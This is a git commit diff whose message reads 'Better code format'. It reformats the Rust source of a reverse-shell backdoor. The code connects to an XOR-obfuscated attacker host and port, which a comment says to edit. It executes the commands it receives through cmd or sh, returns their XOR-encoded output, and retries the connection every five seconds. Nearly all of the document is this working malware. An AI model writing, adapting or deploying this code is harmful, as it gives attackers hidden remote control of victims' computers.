9240583e79a9b5c823173ab5d6f6586cbc0fb37d
dmknght <dmknght@protonmail.com>
2019-07-19 01:49:08 +0700

    Better code format

--- src/main.rs
+++ src/main.rs
@@ -1,17 +1,16 @@
-use std::net::{TcpStream};
 use std::io::{Read, Write};
-use std::str::from_utf8;
+use std::net::TcpStream;
 use std::process::Command;
-use std::time::Duration;
+use std::str::from_utf8;
 use std::thread;
+use std::time::Duration;
 
-fn int_xor(clear_text: &str, key: u8) -> String{
+fn int_xor(clear_text: &str, key: u8) -> String {
 	let mut enc_text = "".to_string();
 	for chr in clear_text.chars() {
 		if chr.to_string() == "\n" {
 			enc_text = enc_text + &chr.to_string();
-		}
-		else {
+		} else {
 			let tmp = chr as u8 ^ key;
 			let chr = tmp as char;
 			enc_text = enc_text + &chr.to_string();
@@ -24,9 +23,12 @@ fn main() {
 	let key: u8 = 16;
 	let addr = &*int_xor("!\"\'> > >!*((((", key); // Attacker host and port. EDIT here
 	loop {
-		match TcpStream::connect(addr) { // Try create TCP connection
-			Ok(mut conn) => { // If connected
-				loop { // Create endless loop
+		match TcpStream::connect(addr) {
+			// Try create TCP connection
+			Ok(mut conn) => {
+				// If connected
+				loop {
+					// Create endless loop
 					let mut data = [0; 64]; // Create data
 					match conn.read(&mut data) {
 						Ok(_) => {
@@ -34,28 +36,29 @@ fn main() {
 							/* Remove Null byte in command (Error while running commands*/
 							/* https://stackoverflow.com/a/49406848 */
 							command = command.trim_matches(char::from(0));
-//							command = &*int_xor(command, key);
+							//							command = &*int_xor(command, key);
 							let cmd = &*int_xor(command, key);
-//							command = tmp;
+							//							command = tmp;
 							if cmd == "exit\n" {
 								break;
-							}
-							else if cmd == "killself\n" {
+							} else if cmd == "killself\n" {
 								return;
-							}
-							else {
+							} else {
 								let output = if cfg!(target_os = "windows") {
 									Command::new("cmd").args(&["/C", cmd]).output().unwrap()
 								} else {
 									Command::new("sh").arg("-c").arg(cmd).output().unwrap()
 								};
-								conn.write(int_xor(from_utf8(&output.stdout).unwrap(), key).as_bytes()).unwrap();
+								conn.write(
+									int_xor(from_utf8(&output.stdout).unwrap(), key).as_bytes(),
+								)
+									 .unwrap();
 							}
-						},
+						}
 						Err(_) => {}
 					}
 				}
-			},
+			}
 			Err(_) => {}
 		}
 		thread::sleep(Duration::from_millis(5000))
